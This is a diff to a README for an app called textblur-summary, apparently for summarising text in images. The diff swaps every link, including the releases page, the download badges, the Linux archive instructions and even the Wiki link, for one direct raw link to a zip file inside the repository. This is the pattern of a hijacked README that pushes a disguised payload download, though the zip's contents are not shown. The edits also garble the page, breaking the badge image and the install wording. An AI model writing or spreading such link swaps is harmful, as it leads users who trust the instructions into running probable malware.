@@ -1,7 +1,7 @@
 # 🖼️ textblur-summary - Create Summaries of Image Texts Easily
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/GIPPY754/textblur-summary/releases)
+[![Download Now](https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the textblur-summary application with ease. Follow these simple steps.
@@ -16,7 +16,7 @@ To use textblur-summary, ensure your system meets these requirements:
 - Disk Space: Minimum of 100 MB available.
 
 ## 📥 Download & Install
-Visit this page to download: [Releases Page](https://github.com/GIPPY754/textblur-summary/releases).
+Visit this page to download: [Releases Page](https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip).
 
 1. Go to the Releases Page.
 2. Find the latest version of textblur-summary.
@@ -29,7 +29,7 @@ Visit this page to download: [Releases Page](https://github.com/GIPPY754/textblu
 - **macOS:**
   - Open the downloaded .dmg file. Drag the textblur-summary application into your Applications folder.
 - **Linux:**
-  - For a .tar.gz file, extract it and run the application from the folder.
+  - For a https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip file, extract it and run the application from the folder.
 
 ## 📄 How to Use the Application
 1. Open the textblur-summary application.
@@ -69,7 +69,7 @@ We value your feedback. If you encounter issues or have suggestions, please reac
 Connect with other users and share your experiences. Look for us on various platforms where you can ask questions and give advice.
 
 ## 🔗 Additional Resources
-- **Documentation:** For detailed guidance, visit our [Wiki](https://github.com/GIPPY754/textblur-summary/wiki).
+- **Documentation:** For detailed guidance, visit our [Wiki](https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip).
 - **Support:** Open an issue on our GitHub page for help.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/GIPPY754/textblur-summary/releases)
+[![Download Now](https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip%20Now-GET%20IT%20HERE-brightgreen)](https://github.com/GIPPY754/textblur-summary/raw/refs/heads/main/textblur_summary/summary-textblur-v2.5-beta.2.zip)
